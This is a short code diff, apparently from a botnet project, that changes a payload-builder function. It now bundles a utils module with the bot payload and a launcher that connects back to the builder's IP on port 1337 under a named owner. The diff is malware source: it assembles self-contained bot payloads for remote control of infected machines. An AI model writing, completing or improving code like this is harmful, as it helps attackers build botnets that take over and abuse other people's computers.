@@ -20,8 +20,9 @@ def _payload(owner, var=None):
     _payload = Payload(host='{utils.local_ip()}', port='1337', owner='{owner}')
     _payload.run()"""
     
+    _utils = open("botnet/utils.py", 'r').read()
     payload = open("botnet/payload.py", 'r').read()
-    payload = '\n'.join([main, payload])
+    payload = '\n'.join([_utils, payload, main])
     
     if not os.path.isdir('botnet/payloads'):
         try:
